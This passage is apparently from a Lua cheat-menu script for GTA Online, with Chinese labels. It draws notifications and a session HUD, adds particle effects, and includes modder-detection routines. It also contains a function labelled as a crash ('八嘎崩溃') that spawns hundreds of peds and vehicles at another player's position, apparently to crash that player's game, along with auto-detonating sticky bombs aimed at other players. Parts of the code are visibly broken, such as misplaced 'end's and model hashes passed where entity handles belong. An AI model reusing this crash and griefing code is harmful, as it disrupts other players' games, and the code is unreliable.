                        0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
                        self.notif_width + (self.notif_padding * 2),
                        self.notif_banner_height * aspect_16_9 * notif.animation_state,
                        self.notif_banner_colour
                    )
                    directx.draw_text(
                        1 - self.notif_padding - self.notif_width,
                        0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos,
                        notif.title,
                        ALIGN_TOP_LEFT,
                        self.notif_title_size,
                        {r = 1 * notif.animation_state, g = 1 * notif.animation_state, b = 1 * notif.animation_state, a = 1 * notif.animation_state}
                    )
                    directx.draw_text(
                        1 - self.notif_padding - self.notif_width,
                        0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos + notif.title_height,
                        notif.text,
                        ALIGN_TOP_LEFT,
                        self.notif_text_size,
                        {r = 1 * notif.animation_state, g = 1 * notif.animation_state, b = 1 * notif.animation_state, a = 1 * notif.animation_state}
                    )
    --#endregion
                total_height = total_height + ((notif.total_height + self.notif_padding * 2 + self.notif_spacing) * notif.animation_state)
                if notif.marked_for_deletetion then
                    notif.animation_state = lerp(notif.animation_state, 0, 10 * delta_time)
                    if notif.animation_state < 0.05 then
                        table.remove(active_notifs, i)
                    end
                elseif notif.duration < 0 then
                    notif.marked_for_deletetion = true
                end
                notif.duration = notif.duration - delta_time
            end
            return #active_notifs > 0
        end)
    end

    self.notify = function (title,text, duration, colour)
        if self.use_toast then
            util.toast(title.."\n"..text)
            return
        end
        title = cut_string_to_length(title, self.notif_width, self.notif_title_size)
        text = cut_string_to_length(text, self.notif_width, self.notif_text_size)
        local x, text_heigth = directx.get_text_size(text, self.notif_text_size)
        local xx, title_height = directx.get_text_size(title, self.notif_title_size)
        local hash = util.joaat(title..text)
        local new_notification = {
            title = title,
            flashtimer = self.notif_flash_duration,
            colour = colour or {r = 0.2, g = 0.1, b = 0.3, a = 1},
            duration = duration or 3,
            current_y_pos = -10,
            marked_for_deletetion = false,
            animation_state = 0,
            text = text,
            hash = hash,
            text_height = text_heigth,
            title_height = title_height,
            total_height = title_height + text_heigth
        }
        for i, notif in ipairs(active_notifs) do
            if notif.hash == hash then
                notif.flashtimer = self.notif_flash_duration * 0.5
                notif.marked_for_deletetion = false
                notif.duration = duration or 3
                return
            end
        end
        active_notifs[#active_notifs+1] = new_notification
        if #active_notifs > self.max_notifs then
            table.remove(active_notifs, 1)
        end
        if #active_notifs == 1 then draw_notifs() end
    end

    return self
end

local mcxh=1

local mcr=255

local mcg=0

local mcb=0
function rainbow_color()
        if mcxh==1 and mcg<256 then

            HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)	

            if mcg == 255 then

                mcxh=2

            else

                mcg=mcg+1

            end

        elseif mcxh==2 and mcr>-1 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcr == 0 then

                mcxh=3

            else

                mcr=mcr-1

            end

        elseif mcxh==3 and mcb<256 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcb == 255 then

                mcxh=4

            else

                mcb=mcb+1

            end

        elseif mcxh==4 and mcg>-1 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcg == 0 then

                mcxh=5

            else

                mcg=mcg-1

            end

        elseif mcxh==5 and mcr<256 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcr == 255 then

                mcxh=6

            else

                mcr=mcr+1

            end

        elseif mcxh==6 and mcb>-1 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcb == 0 then

                mcxh=1

            else

                mcb=mcb-1

            end

        end
end
function scripthost()
    inviciamountint = 0
    for pid = 0, 31 do
        if players.exists(pid) and pid ~= players.user() then
            local pped = players.user_ped(pid)
            if pped ~= 0 then
                if players.is_marked_as_modder(pid) then
                    inviciamountint = inviciamountint + 1
                end
            end
        end
local ente

                local ent1e = players.user_ped()
                local ent2e = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                if PED.IS_PED_IN_ANY_VEHICLE(ent1e,true) then
                    ente = ent2e
                else
                    ente = ent1e
                end
                local speede = ENTITY.GET_ENTITY_SPEED(ente)
                local speedcalce = speede * 3.6
            end
        inviciamountintt = inviciamountint
            draw_string(string.format("~h~~y~战局玩家: ~h~~g~"..#players.list()), 0.21,0.820, 0.4,1) 
            draw_string(string.format("~h~~p~作弊玩家: ~h~~r~"..inviciamountintt), 0.21,0.855, 0.4,1) 
			if PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**" then
			draw_string(string.format("~h~~f~战局主机: ~h~~w~无"), 0.21,0.890, 0.4,1)
			else
            draw_string(string.format("~h~~f~战局主机: ~h~~w~"..players.get_name(players.get_host())), 0.21,0.890, 0.4,1)
			end
			if PLAYER.GET_PLAYER_NAME(players.get_script_host()) == "**Invalid**" then
			draw_string(string.format("~h~~q~脚本主机: ~h~~w~无"), 0.21,0.925, 0.4,1)
			else
            draw_string(string.format("~h~~q~脚本主机: ~h~~w~"..players.get_name(players.get_script_host())), 0.21,0.925, 0.4,1)
			end
						local hostxvlie = players.get_host_queue_position(players.user())
			if hostxvlie == 0 then
			draw_string(string.format("~h~~w~你现在是~f~战局主机"), 0.21,0.960, 0.4,1) 
			else
			draw_string(string.format("~h~~w~你的主机~f~优先度:~h~~w~ "..hostxvlie), 0.21,0.960, 0.4,1) 
			end
			
end

function xianshishijian(state)
    timeos = state
        if timeos then
            while timeos do
                util.yield(0)
                draw_string(string.format(os.date('~bold~~italic~~b~%Y-%m-%d ~b~%H:%M:%S', os.time())), 0.4,0.05, 0.47,5)
                end
            end 
    end

--恶灵骑士
looped_ptfxs = {}
burning_man_ptfx_asset = "core"
burning_man_ptfx_effect = "fire_wrecked_plane_cockpit"
function elqes()
vehicleelqs = CreateVehicle (1491277511,ENTITY.GET_ENTITY_COORDS(players.user_ped(),false),0,true)
ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicleelqs,true)
VEHICLE.SET_VEHICLE_COLOURS(vehicleelqs,147,147)
VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicleelqs,30,15)
PED.SET_PED_INTO_VEHICLE(players.user_ped(),vehicleelqs,-1)
util.yield(500)
request_ptfx_asset_firemen(burning_man_ptfx_asset)
        for _, boneName in pairs({"wheel_lf", "wheel_lr"}) do
GRAPHICS.USE_PARTICLE_FX_ASSET(burning_man_ptfx_asset)
            local bone_id = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicleelqs, boneName)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(burning_man_ptfx_effect, vehicleelqs, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, bone_id, 0.9, false, false, false, 0, 0, 0, 0)
            looped_ptfxs[#looped_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, false)
      end
end
function request_ptfx_asset_firemen(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

function firewingscale(value)
    fireWingsSettings.scale = value / 10
end

function firewingcolour(colour)
    fireWingsSettings.colour = colour
end
local mildOrangeFire = new.colour( 255, 127, 80 )

fireBreathSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false,
    y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
    z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
}

local fireWings = {
            [1] = {pos = {[1] = 100, [2] =  50}},
            [2] = {pos = {[1] = 100, [2] = -50}},
            [3] = {pos = {[1] = 115, [2] =  50}},
            [4] = {pos = {[1] = 115, [2] = -50}},
            [5] = {pos = {[1] = 160, [2] =  50}},
            [6] = {pos = {[1] = 160, [2] = -50}},
            [7] = {pos = {[1] = 170, [2] =  50}},
            [8] = {pos = {[1] = 170, [2] = -50}},
			[9] = {pos = {[1] = 110, [2] =  50}},
            [10] = {pos = {[1] = 110, [2] = -50}},
			[11] = {pos = {[1] = 120, [2] =  50}},
            [12] = {pos = {[1] = 120, [2] = -50}},
			[13] = {pos = {[1] = 130, [2] =  50}},
            [14] = {pos = {[1] = 130, [2] = -50}},
			[15] = {pos = {[1] = 190, [2] =  50}},
            [16] = {pos = {[1] = 190, [2] = -50}},
			[17] = {pos = {[1] = 175, [2] =  50}},
            [18] = {pos = {[1] = 175, [2] = -50}},
			[19] = {pos = {[1] = 140, [2] =  50}},
            [20] = {pos = {[1] = 140, [2] = -50}},
			[21] = {pos = {[1] = 150, [2] =  50}},
            [22] = {pos = {[1] = 150, [2] = -50}},
			[23] = {pos = {[1] = 180, [2] =  50}},
            [24] = {pos = {[1] = 180, [2] = -50}},
        }

fireWingsSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false
}
local ptfxEgg
function firewing(toggle)
    fireWingsSettings.on = toggle
    if fireWingsSettings.on then
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
        if ptfxEgg == nil then
            local eggHash = 1803116220
            loadModel(eggHash)
            ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
            ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
        end
        for i = 1, #fireWings do
            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                util.yield()
            end
            GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
            fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)

            util.create_tick_handler(function()
                local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                for i = 1, #fireWings do
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)
                end

                ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                return fireWingsSettings.on
            end)
        end
    else
        for i = 1, #fireWings do
            if fireWings[i].ptfx then
                GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                fireWings[i].ptfx = nil
            end
            if ptfxEgg then
                entities.delete_by_handle(ptfxEgg)
                ptfxEgg = nil
            end
        end
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
end
maxHealth_cantseeyouinmap = 328
function undead()
    if  ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), 0)
	end
end
function supermanpersonl()
	local pWeapon = memory.alloc_int()
	WEAPON.GET_CURRENT_PED_WEAPON(players.user_ped(), pWeapon, 1)
	local weaponHash = memory.read_int(pWeapon)
	if WEAPON.IS_PED_ARMED(players.user_ped(), 1) or weaponHash == util.joaat("weapon_unarmed") then
		local pImpactCoords = v3.new()
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), pImpactCoords) then
			set_explosion_proof(players.user_ped(), true)
			util.yield_once()
			FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z - 1.0, 29, 5.0, false, true, 0.3, true)
		elseif not FIRE.IS_EXPLOSION_IN_SPHERE(29, pos.x, pos.y, pos.z, 2.0) then
			set_explosion_proof(players.user_ped(), false)
		end
	end
end
--轨迹
function removeFxs(effects)
	for _, effect in ipairs(effects) do
		GRAPHICS.STOP_PARTICLE_FX_LOOPED(effect, 0)
		GRAPHICS.REMOVE_PARTICLE_FX(effect, 0)
	end
end
function ragdoll_self()
    PED.SET_PED_TO_RAGDOLL(players.user_ped(), 2000, 2000, 0, true, true, true)
end

local function request_ptfx_asset_firework(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
local placed_firework_boxes = {}

function placefirework()
    local animlib = 'anim@mp_fireworks'
    local ptfx_asset = "scr_indep_fireworks"
    local anim_name = 'place_firework_3_box'
    local effect_name = "scr_indep_firework_trailburst"
    request_anim_dict(animlib)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.52, 0.0)
    local ped = players.user_ped()
    ENTITY.FREEZE_ENTITY_POSITION(ped, true)
    TASK.TASK_PLAY_ANIM(ped, animlib, anim_name, -1, -8.0, 3000, 0, 0, false, false, false)
    util.yield(1500)
    local firework_box = entities.create_object(util.joaat('ind_prop_firework_03'), pos, true, false, false)
    local firework_box_pos = ENTITY.GET_ENTITY_COORDS(firework_box)
    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(firework_box)
    ENTITY.FREEZE_ENTITY_POSITION(ped, false)
    util.yield(1000)
    ENTITY.FREEZE_ENTITY_POSITION(firework_box, true)
    placed_firework_boxes[#placed_firework_boxes + 1] = firework_box
end

function fireworkshow()
    if #placed_firework_boxes == 0 then 
         local notification = b_notifications.new()
         notification.notify("八嘎","先放置烟花懂不懂！~")
        return 
    end
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    request_ptfx_asset_firework(ptfx_asset)
      local notification = b_notifications.new()
      notification.notify("八嘎","看好了，烟花来啦！~")
    for i=1, 50 do
        for k,box in pairs(placed_firework_boxes) do 
            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 0.0, 0.0, 0.0)
            util.yield(100)
        end
    end
    for k,box in pairs(placed_firework_boxes) do 
        entities.delete_by_handle(box)
        placed_firework_boxes[box] = nil
    end
end
--八嘎崩溃
function baga()
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
local mdl = util.joaat("A_C_Cat_01")
local mdl2 = util.joaat("U_M_Y_Zombie_01")
local mdl3 = util.joaat("A_F_M_ProlHost_01")
local mdl4 = util.joaat("A_M_M_SouCent_01")
local veh_mdl = util.joaat("insurgent2")
local veh_mdl2 = util.joaat("brawler")
util.request_model(veh_mdl)
util.request_model(veh_mdl2)
util.request_model(mdl)
util.request_model(mdl2)
util.request_model(mdl3)
util.request_model(mdl4)
for i = 1, 250 do
    local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
    local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
    local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
    local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
    local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
    local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
    PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

    PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

    PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

    PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

    PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

    PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

    TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

    TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    util.yield(100)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
    
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

    ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
    PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
    ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
    ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
end
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
entities.delete_by_handle(mdl)
entities.delete_by_handle(mdl2)
entities.delete_by_handle(mdl3)
entities.delete_by_handle(mdl4)
entities.delete_by_handle(veh_mdl)
entities.delete_by_handle(veh_mdl2)
util.yield(1000)
end
------------------------------------
-----------粒子效果轰炸-------------
------------------------------------
function Streamptfx(lib)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
        util.yield()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
end
function fingergun()
    for id, data in pairs(weapon_stuff) do
        local name = data[1]
        local weapon_name = data[2]
        local projectile = util.joaat(weapon_name)
        while not WEAPON.HAS_WEAPON_ASSET_LOADED(projectile) do
            WEAPON.REQUEST_WEAPON_ASSET(projectile, 31, false)
            util.yield(10)
        end
        menu.toggle(finger_thing, name, {}, "", function(state)
            toggled = state
            while toggled do
                if memory.read_int(memory.script_global(4521801 + 930)) == 3 then
                    memory.write_int(memory.script_global(4521801 + 935), NETWORK.GET_NETWORK_TIME())
                    local inst = v3.new()
                    v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
                    local tmp = v3.toDir(inst)
                    v3.set(inst, v3.get(tmp))
                    v3.mul(inst, 1000)
                    v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
                    v3.add(inst, tmp)
                    local x, y, z = v3.get(inst)
                    local fingerPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0xff9, 1.0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(fingerPos.x, fingerPos.y, fingerPos.z, x, y, z, 1, true, projectile, 0, true, false, 500.0, players.user_ped(), 0)
                end
                util.yield(100)
            end
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 999999, 0)
        end)
    end
end
proxyStickySettings = {players = true, npcs = false, radius = 2}
local function autoExplodeStickys(ped)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    if MISC.IS_PROJECTILE_TYPE_WITHIN_DISTANCE(pos.x, pos.y, pos.z, util.joaat('weapon_stickybomb'), proxyStickySettings.radius, true) then
        WEAPON.EXPLODE_PROJECTILES(players.user_ped(), util.joaat('weapon_stickybomb'))
    end
end
function proxyStickys()
    if proxyStickySettings.players then
        local specificWhitelistGroup = {user = false,  friends = whitelistGroups.friends, strangers = whitelistGroups.strangers}
        local playerList = getNonWhitelistedPlayers(whitelistListTable, specificWhitelistGroup, whitelistedName)
        for _, pid in pairs(playerList) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            autoExplodeStickys(ped)
        end
    end
    if proxyStickySettings.npcs then
        local pedHandles = entities.get_all_peds_as_handles()
        for _, ped in pairs(pedHandles) do
            if not PED.IS_PED_A_PLAYER(ped) then
                autoExplodeStickys(ped)
            end
        end
    end
end
function proxyStickys_players(toggle)
    proxyStickySettings.players = toggle
end
function proxystickys_npc(toggle)
    proxyStickySettings.npcs = toggle
end
function proxysticks_radius(value)
    proxyStickySettings.radius = value
end
local HitEffect = {colorCanChange = false}
HitEffect.__index = HitEffect
setmetatable(HitEffect, Effect)
--车辆无敌检测
function cargod_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY._GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                    util.draw_debug_text(players.get_name(pid) .. "载具处于无敌模式")
                    break
                end
            end
        end
    end 
end
--未发布载具检测
function unreleased_car_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. "正在驾驶未发布的车辆")
            end
        end
    end
end
--无法获得武器检测
function cantgetweapon_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and WEAPON.IS_PED_ARMED(ped, 7) then
                util.draw_debug_text(players.get_name(pid) .. "正在使用无法获得武器")
                break
            end
        end
    end
end
--无法获得载具检测
function cantgetvar_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. " 正在驾驶无法获得的载具,很有可能是作弊者")
                break
            end
        end
    end
end
--室内使用武器检测
function usingweapon_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if players.is_in_interior(pid) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(pid) .. " 正在室内使用武器,极大可能是作弊者")
            break
        end
    end
end
--超级驾驶检测
function supercar_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and (players.get_vehicle_model(pid) ~= util.joaat("oppressor") or players.get_vehicle_model(pid) ~= util.joaat("oppressor2")) then
            util.toast(players.get_name(pid) .. " 正在使用超级驾驶")
            break
        end
    end
end
--超级跑检测
function superrun_detection()
    for _, pid in ipairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and get_interior_player_is_in(pid) == 0 and get_transition_state(pid) ~= 0 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) <= 300.0 and ped_speed > 25 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(pid) .. " 是超级跑")
            break
        end
    end
end
--观看检测
function lookingyou_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
